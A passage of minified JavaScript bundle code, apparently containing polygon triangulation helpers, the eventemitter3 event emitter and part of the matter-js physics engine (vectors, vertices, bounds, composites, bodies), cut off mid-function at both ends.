u=e[a]*i,l=a<h-1?e[a+1]*i:t.length;o-=Math.abs(S(t,u,l,i))}var c=0;for(a=0;a<r.length;a+=3){var d=r[a]*i,p=r[a+1]*i,f=r[a+2]*i;c+=Math.abs((t[d]-t[f])*(t[p+1]-t[d+1])-(t[d]-t[p])*(t[f+1]-t[d+1]))}return 0===o&&0===c?0:Math.abs((c-o)/o)},e.flatten=function(t){for(var e=t[0][0].length,i={vertices:[],holes:[],dimensions:e},r=0,n=0;n<t.length;n++){for(var s=0;s<t[n].length;s++)for(var o=0;o<e;o++)i.vertices.push(t[n][s][o]);n>0&&(r+=t[n-1].length,i.holes.push(r))}return i}},729:t=>{"use strict";var e=Object.prototype.hasOwnProperty,i="~";function r(){}function n(t,e,i){this.fn=t,this.context=e,this.once=i||!1}function s(t,e,r,s,o){if("function"!=typeof r)throw new TypeError("The listener must be a function");var a=new n(r,s||t,o),h=i?i+e:e;return t._events[h]?t._events[h].fn?t._events[h]=[t._events[h],a]:t._events[h].push(a):(t._events[h]=a,t._eventsCount++),t}function o(t,e){0==--t._eventsCount?t._events=new r:delete t._events[e]}function a(){this._events=new r,this._eventsCount=0}Object.create&&(r.prototype=Object.create(null),(new r).__proto__||(i=!1)),a.prototype.eventNames=function(){var t,r,n=[];if(0===this._eventsCount)return n;for(r in t=this._events)e.call(t,r)&&n.push(i?r.slice(1):r);return Object.getOwnPropertySymbols?n.concat(Object.getOwnPropertySymbols(t)):n},a.prototype.listeners=function(t){var e=i?i+t:t,r=this._events[e];if(!r)return[];if(r.fn)return[r.fn];for(var n=0,s=r.length,o=new Array(s);n<s;n++)o[n]=r[n].fn;return o},a.prototype.listenerCount=function(t){var e=i?i+t:t,r=this._events[e];return r?r.fn?1:r.length:0},a.prototype.emit=function(t,e,r,n,s,o){var a=i?i+t:t;if(!this._events[a])return!1;var h,u,l=this._events[a],c=arguments.length;if(l.fn){switch(l.once&&this.removeListener(t,l.fn,void 0,!0),c){case 1:return l.fn.call(l.context),!0;case 2:return l.fn.call(l.context,e),!0;case 3:return l.fn.call(l.context,e,r),!0;case 4:return l.fn.call(l.context,e,r,n),!0;case 5:return l.fn.call(l.context,e,r,n,s),!0;case 6:return l.fn.call(l.context,e,r,n,s,o),!0}for(u=1,h=new Array(c-1);u<c;u++)h[u-1]=arguments[u];l.fn.apply(l.context,h)}else{var d,p=l.length;for(u=0;u<p;u++)switch(l[u].once&&this.removeListener(t,l[u].fn,void 0,!0),c){case 1:l[u].fn.call(l[u].context);break;case 2:l[u].fn.call(l[u].context,e);break;case 3:l[u].fn.call(l[u].context,e,r);break;case 4:l[u].fn.call(l[u].context,e,r,n);break;default:if(!h)for(d=1,h=new Array(c-1);d<c;d++)h[d-1]=arguments[d];l[u].fn.apply(l[u].context,h)}}return!0},a.prototype.on=function(t,e,i){return s(this,t,e,i,!1)},a.prototype.once=function(t,e,i){return s(this,t,e,i,!0)},a.prototype.removeListener=function(t,e,r,n){var s=i?i+t:t;if(!this._events[s])return this;if(!e)return o(this,s),this;var a=this._events[s];if(a.fn)a.fn!==e||n&&!a.once||r&&a.context!==r||o(this,s);else{for(var h=0,u=[],l=a.length;h<l;h++)(a[h].fn!==e||n&&!a[h].once||r&&a[h].context!==r)&&u.push(a[h]);u.length?this._events[s]=1===u.length?u[0]:u:o(this,s)}return this},a.prototype.removeAllListeners=function(t){var e;return t?(e=i?i+t:t,this._events[e]&&o(this,e)):(this._events=new r,this._eventsCount=0),this},a.prototype.off=a.prototype.removeListener,a.prototype.addListener=a.prototype.on,a.prefixed=i,a.EventEmitter=a,t.exports=a},842:function(t,e,i){var r;r=function(){return function(t){var e={};function i(r){if(e[r])return e[r].exports;var n=e[r]={i:r,l:!1,exports:{}};return t[r].call(n.exports,n,n.exports,i),n.l=!0,n.exports}return i.m=t,i.c=e,i.d=function(t,e,r){i.o(t,e)||Object.defineProperty(t,e,{enumerable:!0,get:r})},i.r=function(t){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(t,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(t,"__esModule",{value:!0})},i.t=function(t,e){if(1&e&&(t=i(t)),8&e)return t;if(4&e&&"object"==typeof t&&t&&t.__esModule)return t;var r=Object.create(null);if(i.r(r),Object.defineProperty(r,"default",{enumerable:!0,value:t}),2&e&&"string"!=typeof t)for(var n in t)i.d(r,n,function(e){return t[e]}.bind(null,n));return r},i.n=function(t){var e=t&&t.__esModule?function(){return t.default}:function(){return t};return i.d(e,"a",e),e},i.o=function(t,e){return Object.prototype.hasOwnProperty.call(t,e)},i.p="",i(i.s=21)}([function(t,e){var r={};t.exports=r,function(){r._nextId=0,r._seed=0,r._nowStartTime=+new Date,r._warnedOnce={},r._decomp=null,r.extend=function(t,e){var i,n;"boolean"==typeof e?(i=2,n=e):(i=1,n=!0);for(var s=i;s<arguments.length;s++){var o=arguments[s];if(o)for(var a in o)n&&o[a]&&o[a].constructor===Object?t[a]&&t[a].constructor!==Object?t[a]=o[a]:(t[a]=t[a]||{},r.extend(t[a],n,o[a])):t[a]=o[a]}return t},r.clone=function(t,e){return r.extend({},e,t)},r.keys=function(t){if(Object.keys)return Object.keys(t);var e=[];for(var i in t)e.push(i);return e},r.values=function(t){var e=[];if(Object.keys){for(var i=Object.keys(t),r=0;r<i.length;r++)e.push(t[i[r]]);return e}for(var n in t)e.push(t[n]);return e},r.get=function(t,e,i,r){e=e.split(".").slice(i,r);for(var n=0;n<e.length;n+=1)t=t[e[n]];return t},r.set=function(t,e,i,n,s){var o=e.split(".").slice(n,s);return r.get(t,e,0,-1)[o[o.length-1]]=i,i},r.shuffle=function(t){for(var e=t.length-1;e>0;e--){var i=Math.floor(r.random()*(e+1)),n=t[e];t[e]=t[i],t[i]=n}return t},r.choose=function(t){return t[Math.floor(r.random()*t.length)]},r.isElement=function(t){return"undefined"!=typeof HTMLElement?t instanceof HTMLElement:!!(t&&t.nodeType&&t.nodeName)},r.isArray=function(t){return"[object Array]"===Object.prototype.toString.call(t)},r.isFunction=function(t){return"function"==typeof t},r.isPlainObject=function(t){return"object"==typeof t&&t.constructor===Object},r.isString=function(t){return"[object String]"===toString.call(t)},r.clamp=function(t,e,i){return t<e?e:t>i?i:t},r.sign=function(t){return t<0?-1:1},r.now=function(){if("undefined"!=typeof window&&window.performance){if(window.performance.now)return window.performance.now();if(window.performance.webkitNow)return window.performance.webkitNow()}return Date.now?Date.now():new Date-r._nowStartTime},r.random=function(e,i){return i=void 0!==i?i:1,(e=void 0!==e?e:0)+t()*(i-e)};var t=function(){return r._seed=(9301*r._seed+49297)%233280,r._seed/233280};r.colorToNumber=function(t){return 3==(t=t.replace("#","")).length&&(t=t.charAt(0)+t.charAt(0)+t.charAt(1)+t.charAt(1)+t.charAt(2)+t.charAt(2)),parseInt(t,16)},r.logLevel=1,r.log=function(){console&&r.logLevel>0&&r.logLevel<=3&&console.log.apply(console,["matter-js:"].concat(Array.prototype.slice.call(arguments)))},r.info=function(){console&&r.logLevel>0&&r.logLevel<=2&&console.info.apply(console,["matter-js:"].concat(Array.prototype.slice.call(arguments)))},r.warn=function(){console&&r.logLevel>0&&r.logLevel<=3&&console.warn.apply(console,["matter-js:"].concat(Array.prototype.slice.call(arguments)))},r.warnOnce=function(){var t=Array.prototype.slice.call(arguments).join(" ");r._warnedOnce[t]||(r.warn(t),r._warnedOnce[t]=!0)},r.deprecated=function(t,e,i){t[e]=r.chain((function(){r.warnOnce("🔅 deprecated 🔅",i)}),t[e])},r.nextId=function(){return r._nextId++},r.indexOf=function(t,e){if(t.indexOf)return t.indexOf(e);for(var i=0;i<t.length;i++)if(t[i]===e)return i;return-1},r.map=function(t,e){if(t.map)return t.map(e);for(var i=[],r=0;r<t.length;r+=1)i.push(e(t[r]));return i},r.topologicalSort=function(t){var e=[],i=[],n=[];for(var s in t)i[s]||n[s]||r._topologicalSort(s,i,n,t,e);return e},r._topologicalSort=function(t,e,i,n,s){var o=n[t]||[];i[t]=!0;for(var a=0;a<o.length;a+=1){var h=o[a];i[h]||e[h]||r._topologicalSort(h,e,i,n,s)}i[t]=!1,e[t]=!0,s.push(t)},r.chain=function(){for(var t=[],e=0;e<arguments.length;e+=1){var i=arguments[e];i._chained?t.push.apply(t,i._chained):t.push(i)}var r=function(){for(var e,i=new Array(arguments.length),r=0,n=arguments.length;r<n;r++)i[r]=arguments[r];for(r=0;r<t.length;r+=1){var s=t[r].apply(e,i);void 0!==s&&(e=s)}return e};return r._chained=t,r},r.chainPathBefore=function(t,e,i){return r.set(t,e,r.chain(i,r.get(t,e)))},r.chainPathAfter=function(t,e,i){return r.set(t,e,r.chain(r.get(t,e),i))},r.setDecomp=function(t){r._decomp=t},r.getDecomp=function(){var t=r._decomp;try{t||"undefined"==typeof window||(t=window.decomp),t||void 0===i.g||(t=i.g.decomp)}catch(e){t=null}return t}}()},function(t,e){var i={};t.exports=i,i.create=function(t){var e={min:{x:0,y:0},max:{x:0,y:0}};return t&&i.update(e,t),e},i.update=function(t,e,i){t.min.x=1/0,t.max.x=-1/0,t.min.y=1/0,t.max.y=-1/0;for(var r=0;r<e.length;r++){var n=e[r];n.x>t.max.x&&(t.max.x=n.x),n.x<t.min.x&&(t.min.x=n.x),n.y>t.max.y&&(t.max.y=n.y),n.y<t.min.y&&(t.min.y=n.y)}i&&(i.x>0?t.max.x+=i.x:t.min.x+=i.x,i.y>0?t.max.y+=i.y:t.min.y+=i.y)},i.contains=function(t,e){return e.x>=t.min.x&&e.x<=t.max.x&&e.y>=t.min.y&&e.y<=t.max.y},i.overlaps=function(t,e){return t.min.x<=e.max.x&&t.max.x>=e.min.x&&t.max.y>=e.min.y&&t.min.y<=e.max.y},i.translate=function(t,e){t.min.x+=e.x,t.max.x+=e.x,t.min.y+=e.y,t.max.y+=e.y},i.shift=function(t,e){var i=t.max.x-t.min.x,r=t.max.y-t.min.y;t.min.x=e.x,t.max.x=e.x+i,t.min.y=e.y,t.max.y=e.y+r}},function(t,e){var i={};t.exports=i,i.create=function(t,e){return{x:t||0,y:e||0}},i.clone=function(t){return{x:t.x,y:t.y}},i.magnitude=function(t){return Math.sqrt(t.x*t.x+t.y*t.y)},i.magnitudeSquared=function(t){return t.x*t.x+t.y*t.y},i.rotate=function(t,e,i){var r=Math.cos(e),n=Math.sin(e);i||(i={});var s=t.x*r-t.y*n;return i.y=t.x*n+t.y*r,i.x=s,i},i.rotateAbout=function(t,e,i,r){var n=Math.cos(e),s=Math.sin(e);r||(r={});var o=i.x+((t.x-i.x)*n-(t.y-i.y)*s);return r.y=i.y+((t.x-i.x)*s+(t.y-i.y)*n),r.x=o,r},i.normalise=function(t){var e=i.magnitude(t);return 0===e?{x:0,y:0}:{x:t.x/e,y:t.y/e}},i.dot=function(t,e){return t.x*e.x+t.y*e.y},i.cross=function(t,e){return t.x*e.y-t.y*e.x},i.cross3=function(t,e,i){return(e.x-t.x)*(i.y-t.y)-(e.y-t.y)*(i.x-t.x)},i.add=function(t,e,i){return i||(i={}),i.x=t.x+e.x,i.y=t.y+e.y,i},i.sub=function(t,e,i){return i||(i={}),i.x=t.x-e.x,i.y=t.y-e.y,i},i.mult=function(t,e){return{x:t.x*e,y:t.y*e}},i.div=function(t,e){return{x:t.x/e,y:t.y/e}},i.perp=function(t,e){return{x:(e=!0===e?-1:1)*-t.y,y:e*t.x}},i.neg=function(t){return{x:-t.x,y:-t.y}},i.angle=function(t,e){return Math.atan2(e.y-t.y,e.x-t.x)},i._temp=[i.create(),i.create(),i.create(),i.create(),i.create(),i.create()]},function(t,e,i){var r={};t.exports=r;var n=i(2),s=i(0);r.create=function(t,e){for(var i=[],r=0;r<t.length;r++){var n=t[r],s={x:n.x,y:n.y,index:r,body:e,isInternal:!1};i.push(s)}return i},r.fromPath=function(t,e){var i=[];return t.replace(/L?\s*([-\d.e]+)[\s,]*([-\d.e]+)*/gi,(function(t,e,r){i.push({x:parseFloat(e),y:parseFloat(r)})})),r.create(i,e)},r.centre=function(t){for(var e,i,s,o=r.area(t,!0),a={x:0,y:0},h=0;h<t.length;h++)s=(h+1)%t.length,e=n.cross(t[h],t[s]),i=n.mult(n.add(t[h],t[s]),e),a=n.add(a,i);return n.div(a,6*o)},r.mean=function(t){for(var e={x:0,y:0},i=0;i<t.length;i++)e.x+=t[i].x,e.y+=t[i].y;return n.div(e,t.length)},r.area=function(t,e){for(var i=0,r=t.length-1,n=0;n<t.length;n++)i+=(t[r].x-t[n].x)*(t[r].y+t[n].y),r=n;return e?i/2:Math.abs(i)/2},r.inertia=function(t,e){for(var i,r,s=0,o=0,a=t,h=0;h<a.length;h++)r=(h+1)%a.length,s+=(i=Math.abs(n.cross(a[r],a[h])))*(n.dot(a[r],a[r])+n.dot(a[r],a[h])+n.dot(a[h],a[h])),o+=i;return e/6*(s/o)},r.translate=function(t,e,i){i=void 0!==i?i:1;var r,n=t.length,s=e.x*i,o=e.y*i;for(r=0;r<n;r++)t[r].x+=s,t[r].y+=o;return t},r.rotate=function(t,e,i){if(0!==e){var r,n,s,o,a=Math.cos(e),h=Math.sin(e),u=i.x,l=i.y,c=t.length;for(o=0;o<c;o++)n=(r=t[o]).x-u,s=r.y-l,r.x=u+(n*a-s*h),r.y=l+(n*h+s*a);return t}},r.contains=function(t,e){for(var i,r=e.x,n=e.y,s=t.length,o=t[s-1],a=0;a<s;a++){if(i=t[a],(r-o.x)*(i.y-o.y)+(n-o.y)*(o.x-i.x)>0)return!1;o=i}return!0},r.scale=function(t,e,i,s){if(1===e&&1===i)return t;var o,a;s=s||r.centre(t);for(var h=0;h<t.length;h++)o=t[h],a=n.sub(o,s),t[h].x=s.x+a.x*e,t[h].y=s.y+a.y*i;return t},r.chamfer=function(t,e,i,r,o){e="number"==typeof e?[e]:e||[8],i=void 0!==i?i:-1,r=r||2,o=o||14;for(var a=[],h=0;h<t.length;h++){var u=t[h-1>=0?h-1:t.length-1],l=t[h],c=t[(h+1)%t.length],d=e[h<e.length?h:e.length-1];if(0!==d){var p=n.normalise({x:l.y-u.y,y:u.x-l.x}),f=n.normalise({x:c.y-l.y,y:l.x-c.x}),g=Math.sqrt(2*Math.pow(d,2)),m=n.mult(s.clone(p),d),v=n.normalise(n.mult(n.add(p,f),.5)),_=n.sub(l,n.mult(v,g)),y=i;-1===i&&(y=1.75*Math.pow(d,.32)),(y=s.clamp(y,r,o))%2==1&&(y+=1);for(var x=Math.acos(n.dot(p,f))/y,E=0;E<y;E++)a.push(n.add(n.rotate(m,x*E),_))}else a.push(l)}return a},r.clockwiseSort=function(t){var e=r.mean(t);return t.sort((function(t,i){return n.angle(e,t)-n.angle(e,i)})),t},r.isConvex=function(t){var e,i,r,n,s=0,o=t.length;if(o<3)return null;for(e=0;e<o;e++)if(r=(e+2)%o,n=(t[i=(e+1)%o].x-t[e].x)*(t[r].y-t[i].y),(n-=(t[i].y-t[e].y)*(t[r].x-t[i].x))<0?s|=1:n>0&&(s|=2),3===s)return!1;return 0!==s||null},r.hull=function(t){var e,i,r=[],s=[];for((t=t.slice(0)).sort((function(t,e){var i=t.x-e.x;return 0!==i?i:t.y-e.y})),i=0;i<t.length;i+=1){for(e=t[i];s.length>=2&&n.cross3(s[s.length-2],s[s.length-1],e)<=0;)s.pop();s.push(e)}for(i=t.length-1;i>=0;i-=1){for(e=t[i];r.length>=2&&n.cross3(r[r.length-2],r[r.length-1],e)<=0;)r.pop();r.push(e)}return r.pop(),s.pop(),r.concat(s)}},function(t,e,i){var r={};t.exports=r;var n=i(0);r.on=function(t,e,i){for(var r,n=e.split(" "),s=0;s<n.length;s++)r=n[s],t.events=t.events||{},t.events[r]=t.events[r]||[],t.events[r].push(i);return i},r.off=function(t,e,i){if(e){"function"==typeof e&&(i=e,e=n.keys(t.events).join(" "));for(var r=e.split(" "),s=0;s<r.length;s++){var o=t.events[r[s]],a=[];if(i&&o)for(var h=0;h<o.length;h++)o[h]!==i&&a.push(o[h]);t.events[r[s]]=a}}else t.events={}},r.trigger=function(t,e,i){var r,s,o,a,h=t.events;if(h&&n.keys(h).length>0){i||(i={}),r=e.split(" ");for(var u=0;u<r.length;u++)if(o=h[s=r[u]]){(a=n.clone(i,!1)).name=s,a.source=t;for(var l=0;l<o.length;l++)o[l].apply(t,[a])}}}},function(t,e,i){var r={};t.exports=r;var n=i(4),s=i(0),o=i(1),a=i(6);r.create=function(t){return s.extend({id:s.nextId(),type:"composite",parent:null,isModified:!1,bodies:[],constraints:[],composites:[],label:"Composite",plugin:{},cache:{allBodies:null,allConstraints:null,allComposites:null}},t)},r.setModified=function(t,e,i,n){if(t.isModified=e,e&&t.cache&&(t.cache.allBodies=null,t.cache.allConstraints=null,t.cache.allComposites=null),i&&t.parent&&r.setModified(t.parent,e,i,n),n)for(var s=0;s<t.composites.length;s++){var o=t.composites[s];r.setModified(o,e,i,n)}},r.add=function(t,e){var i=[].concat(e);n.trigger(t,"beforeAdd",{object:e});for(var o=0;o<i.length;o++){var a=i[o];switch(a.type){case"body":if(a.parent!==a){s.warn("Composite.add: skipped adding a compound body part (you must add its parent instead)");break}r.addBody(t,a);break;case"constraint":r.addConstraint(t,a);break;case"composite":r.addComposite(t,a);break;case"mouseConstraint":r.addConstraint(t,a.constraint)}}return n.trigger(t,"afterAdd",{object:e}),t},r.remove=function(t,e,i){var s=[].concat(e);n.trigger(t,"beforeRemove",{object:e});for(var o=0;o<s.length;o++){var a=s[o];switch(a.type){case"body":r.removeBody(t,a,i);break;case"constraint":r.removeConstraint(t,a,i);break;case"composite":r.removeComposite(t,a,i);break;case"mouseConstraint":r.removeConstraint(t,a.constraint)}}return n.trigger(t,"afterRemove",{object:e}),t},r.addComposite=function(t,e){return t.composites.push(e),e.parent=t,r.setModified(t,!0,!0,!1),t},r.removeComposite=function(t,e,i){var n=s.indexOf(t.composites,e);if(-1!==n&&r.removeCompositeAt(t,n),i)for(var o=0;o<t.composites.length;o++)r.removeComposite(t.composites[o],e,!0);return t},r.removeCompositeAt=function(t,e){return t.composites.splice(e,1),r.setModified(t,!0,!0,!1),t},r.addBody=function(t,e){return t.bodies.push(e),r.setModified(t,!0,!0,!1),t},r.removeBody=function(t,e,i){var n=s.indexOf(t.bodies,e);if(-1!==n&&r.removeBodyAt(t,n),i)for(var o=0;o<t.composites.length;o++)r.removeBody(t.composites[o],e,!0);return t},r.removeBodyAt=function(t,e){return t.bodies.splice(e,1),r.setModified(t,!0,!0,!1),t},r.addConstraint=function(t,e){return t.constraints.push(e),r.setModified(t,!0,!0,!1),t},r.removeConstraint=function(t,e,i){var n=s.indexOf(t.constraints,e);if(-1!==n&&r.removeConstraintAt(t,n),i)for(var o=0;o<t.composites.length;o++)r.removeConstraint(t.composites[o],e,!0);return t},r.removeConstraintAt=function(t,e){return t.constraints.splice(e,1),r.setModified(t,!0,!0,!1),t},r.clear=function(t,e,i){if(i)for(var n=0;n<t.composites.length;n++)r.clear(t.composites[n],e,!0);return e?t.bodies=t.bodies.filter((function(t){return t.isStatic})):t.bodies.length=0,t.constraints.length=0,t.composites.length=0,r.setModified(t,!0,!0,!1),t},r.allBodies=function(t){if(t.cache&&t.cache.allBodies)return t.cache.allBodies;for(var e=[].concat(t.bodies),i=0;i<t.composites.length;i++)e=e.concat(r.allBodies(t.composites[i]));return t.cache&&(t.cache.allBodies=e),e},r.allConstraints=function(t){if(t.cache&&t.cache.allConstraints)return t.cache.allConstraints;for(var e=[].concat(t.constraints),i=0;i<t.composites.length;i++)e=e.concat(r.allConstraints(t.composites[i]));return t.cache&&(t.cache.allConstraints=e),e},r.allComposites=function(t){if(t.cache&&t.cache.allComposites)return t.cache.allComposites;for(var e=[].concat(t.composites),i=0;i<t.composites.length;i++)e=e.concat(r.allComposites(t.composites[i]));return t.cache&&(t.cache.allComposites=e),e},r.get=function(t,e,i){var n,s;switch(i){case"body":n=r.allBodies(t);break;case"constraint":n=r.allConstraints(t);break;case"composite":n=r.allComposites(t).concat(t)}return n?0===(s=n.filter((function(t){return t.id.toString()===e.toString()}))).length?null:s[0]:null},r.move=function(t,e,i){return r.remove(t,e),r.add(i,e),t},r.rebase=function(t){for(var e=r.allBodies(t).concat(r.allConstraints(t)).concat(r.allComposites(t)),i=0;i<e.length;i++)e[i].id=s.nextId();return t},r.translate=function(t,e,i){for(var n=i?r.allBodies(t):t.bodies,s=0;s<n.length;s++)a.translate(n[s],e);return t},r.rotate=function(t,e,i,n){for(var s=Math.cos(e),o=Math.sin(e),h=n?r.allBodies(t):t.bodies,u=0;u<h.length;u++){var l=h[u],c=l.position.x-i.x,d=l.position.y-i.y;a.setPosition(l,{x:i.x+(c*s-d*o),y:i.y+(c*o+d*s)}),a.rotate(l,e)}return t},r.scale=function(t,e,i,n,s){for(var o=s?r.allBodies(t):t.bodies,h=0;h<o.length;h++){var u=o[h],l=u.position.x-n.x,c=u.position.y-n.y;a.setPosition(u,{x:n.x+l*e,y:n.y+c*i}),a.scale(u,e,i)}return t},r.bounds=function(t){for(var e=r.allBodies(t),i=[],n=0;n<e.length;n+=1){var s=e[n];i.push(s.bounds.min,s.bounds.max)}return o.create(i)}},function(t,e,i){var r={};t.exports=r;var n=i(3),s=i(2),o=i(7),a=(i(16),i(0)),h=i(1),u=i(11);!function(){r._inertiaScale=4,r._nextCollidingGroupId=1,r._nextNonCollidingGroupId=-1,r._nextCategory=1,r.create=function(e){var i={id:a.nextId(),type:"body",label:"Body",parts:[],plugin:{},angle:0,vertices:n.fromPath("L 0 0 L 40 0 L 40 40 L 0 40"),position:{x:0,y:0},force:{x:0,y:0},torque:0,positionImpulse:{x:0,y:0},constraintImpulse:{x:0,y:0,angle:0},totalContacts:0,speed:0,angularSpeed:0,velocity:{x:0,y:0},angularVelocity:0,isSensor:!1,isStatic:!1,isSleeping:!1,motion:0,sleepThreshold:60,density:.001,restitution:0,friction:.1,frictionStatic:.5,frictionAir:.01,collisionFilter:{category:1,mask:4294967295,group:0},slop:.05,timeScale:1,render:{visible:!0,opacity:1,strokeStyle:null,fillStyle:null,lineWidth:null,sprite:{xScale:1,yScale:1,xOffset:0,yOffset:0}},events:null,bounds:null,chamfer:null,circleRadius:0,positionPrev:null,anglePrev:0,parent:null,axes:null,area:0,mass:0,inertia:0,_original:null},r=a.extend(i,e);return t(r,e),r},r.nextGroup=function(t){return t?r._nextNonCollidingGroupId--:r._nextCollidingGroupId++},r.nextCategory=function(){return r._nextCategory=r._nextCategory<<1,r._nextCategory};var t=function(t,e){e=e||{},r.set(t,{bounds:t.bounds||h.create(t.vertices),positionPrev:t.positionPrev||s.clone(t.position),anglePrev:t.anglePrev||t.angle,vertices:t.vertices,parts:t.parts||[t],isStatic:t.isStatic,isSleeping:t.isSleeping,parent:t.parent||t}),n.rotate(t.vertices,t.angle,t.position),u.rotate(t.axes,t.angle),h.update(t.bounds,t.vertices,t.velocity),r.set(t,{axes:e.axes||t.axes,area:e.area||t.area,mass:e.mass||t.mass,inertia:e.inertia||t.inertia});var i=t.isStatic?"#14151f":a.choose(["#f19648","#f5d259","#f55a3c","#063e7b","#ececd1"]),o=t.isStatic?"#555":"#ccc",l=t.isStatic&&null===t.render.fillStyle?1:0;t.render.fillStyle=t.render.fillStyle||i,t.render.strokeStyle=t.render.strokeStyle||o,t.render.lineWidth=t.render.lineWidth||l,t.render.sprite.xOffset+=-(t.bounds.min.x-t.position.x)/(t.bounds.max.x-t.bounds.min.x),t.render.sprite.yOffset+=-(t.bounds.min.y-t.position.y)/(t.bounds.max.y-t.bounds.min.y)};r.set=function(t,e,i){var n;for(n in"string"==typeof e&&(n=e,(e={})[n]=i),e)if(Object.prototype.hasOwnProperty.call(e,n))switch(i=e[n],n){case"isStatic":r.setStatic(t,i);break;case"isSleeping":o.set(t,i);break;case"mass":r.setMass(t,i);break;case"density":r.setDensity(t,i);break;case"inertia":r.setInertia(t,i);break;case"vertices":r.setVertices(t,i);break;case"position":r.setPosition(t,i);break;case"angle":r.setAngle(t,i);break;case"velocity":r.setVelocity(t,i);break;case"angularVelocity":r.setAngularVelocity(t,i);break;case"parts":r.setParts(t,i);break;case"centre":r.setCentre(t,i);break;default:t[n]=i}},r.setStatic=function(t,e){for(var i=0;i<t.parts.length;i++){var r=t.parts[i];r.isStatic=e,e?(r._original={restitution:r.restitution,friction:r.friction,mass:r.mass,inertia:r.inertia,density:r.density,inverseMass:r.inverseMass,inverseInertia:r.inverseInertia},r.restitution=0,r.friction=1,r.mass=r.inertia=r.density=1/0,r.inverseMass=r.inverseInertia=0,r.positionPrev.x=r.position.x,r.positionPrev.y=r.position.y,r.anglePrev=r.angle,r.angularVelocity=0,r.speed=0,r.angularSpeed=0,r.motion=0):r._original&&(r.restitution=r._original.restitution,r.friction=r._original.friction,r.mass=r._original.mass,r.inertia=r._original.inertia,r.density=r._original.density,r.inverseMass=r._original.inverseMass,r.inverseInertia=r._original.inverseInertia,r._original=null)}},r.setMass=function(t,e){var i=t.inertia/(t.mass/6);t.inertia=i*(e/6),t.inverseInertia=1/t.inertia,t.mass=e,t.inverseMass=1/t.mass,t.density=t.mass/t.area},r.setDensity=function(t,e){r.setMass(t,e*t.area),t.density=e},r.setInertia=function(t,e){t.inertia=e,t.inverseInertia=1/t.inertia},r.setVertices=function(t,e){e[0].body===t?t.vertices=e:t.vertices=n.create(e,t),t.axes=u.fromVertices(t.vertices),t.area=n.area(t.vertices),r.setMass(t,t.density*t.area);var i=n.centre(t.vertices);n.translate(t.vertices,i,-1),r.setInertia(t,r._inertiaScale*n.inertia(t.vertices,t.mass)),n.translate(t.vertices,t.position),h.update(t.bounds,t.vertices,t.velocity)},r.setParts=function(t,e,i){var s;for(e=e.slice(0),t.parts.length=0,t.parts.push(t),t.parent=t,s=0;s<e.length;s++){var o=e[s];o!==t&&(o.parent=t,t.parts.push(o))}if(1!==t.parts.length){if(i=void 0===i||i){var a=[];for(s=0;s<e.length;s++)a=a.concat(e[s].vertices);n.clockwiseSort(a);var h=n.hull(a),u=n.centre(h);r.setVertices(t,h),n.translate(t.vertices,u)}var l=r._totalProperties(t);t.area=l.area,t.parent=t,t.position.x=l.centre.x,t.position.y=l.centre.y,t.positionPrev.x=l.centre.x,t.positionPrev.y=l.centre.y,r.setMass(t,l.mass),r.setInertia(t,l.inertia),r.setPosition(t,l.centre)}},r.setCentre=function(t,e,i){i?(t.positionPrev.x+=e.x,t.positionPrev.y+=e.y,t.position.x+=e.x,t.position.y+=e.y):(t.positionPrev.x=e.x-(t.position.x-t.positionPrev.x),t.positionPrev.y=e.y-(t.position.y-t.positionPrev.y),t.position.x=e.x,t.position.y=e.y)},r.setPosition=function(t,e){var i=s.sub(e,t.position);t.positionPrev.x+=i.x,t.positionPrev.y+=i.y;for(var r=0;r<t.parts.length;r++){var o=t.parts[r];o.position.x+=i.x,o.position.y+=i.y,n.translate(o.vertices,i),h.update(o.bounds,o.vertices,t.velocity)}},r.setAngle=function(t,e){var i=e-t.angle;t.anglePrev+=i;for(var r=0;r<t.parts.length;r++){var o=t.parts[r];o.angle+=i,n.rotate(o.vertices,i,t.position),u.rotate(o.axes,i),h.update(o.bounds,o.vertices,t.velocity),r>0&&s.rotateAbout(o.position,i,t.position,o.position)}},r.setVelocity=function(t,e){t.positionPrev.x=t.position.x-e.x,t.positionPrev.y=t.position.y-e.y,t.velocity.x=e.x,t.velocity.y=e.y,t.speed=s.magnitude(t.velocity)},r.setAngularVelocity=function(t,e){t.anglePrev=t.angle-e,t.angularVelocity=e,t.angularSpeed=Math.abs(t.angularVelocity)},r.translate=function(t,e){r.setPosition(t,s.add(t.position,e))},r.rotate=function(t,e,i){if(i){var n=Math.cos(e),s=Math.sin(e),o=t.position.x-i.x,a=t.position.y-i.y;r.setPosition(t,{x:i.x+(o*n-a*s),y:i.y+(o*s+a*n)}),r.setAngle(t,t.angle+e)}else r.setAngle(t,t.angle+e)},r.scale=function(t,e,i,s){var o=0,a=0;s=s||t.position;for(var l=0;l<t.parts.length;l++){var c=t.parts[l];n.scale(c.vertices,e,i,s),c.axes=u.fromVertices(c.vertices),c.area=n.area(c.vertices),r.setMass(c,t.density*c.area),n.translate(c.vertices,{x:-c.position.x,y:-c.position.y}),r.setInertia(c,r._inertiaScale*n.inertia(c.vertices,c.mass)),n.translate(c.vertices,{x:c.position.x,y:c.position.y}),l>0&&(o+=c.area,a+=c.inertia),c.position.x=s.x+(c.position.x-s.x)*e,c.position.y=s.y+(c.position.y-s.y)*i,h.update(c.bounds,c.vertices,t.velocity)}t.parts.length>1&&(t.area=o,t.isStatic||(r.setMass(t,t.density*o),r.setInertia(t,a))),t.circleRadius&&(e===i?t.circleRadius*=e:t.circleRadius=null)},r.update=function(t,e,i,r){var o=Math.pow(e*i*t.timeScale,2),a=1-t.frictionAir*i*t.timeScale,l=t.position.x-t.positionPrev.x,c=t.position.y-t.positionPrev.y;t.velocity.x=l*a*r+t.force.x/t.mass*o,t.velocity.y=c*a*r+t.force.y/t.mass*o,t.positionPrev.x=t.position.x,t.positionPrev.y=t.position.y,t.position.x+=t.velocity.x,t.position.y+=t.velocity.y,t.angularVelocity=(t.angle-t.anglePrev)*a*r+t.torque/t.inertia*o,t.anglePrev=t.angle,t.angle+=t.angularVelocity,t.speed=s.magnitude(t.velocity),t.angularSpeed=Math.abs(t.angularVelocity);for(var d=0;d<t.parts.length;d++){var 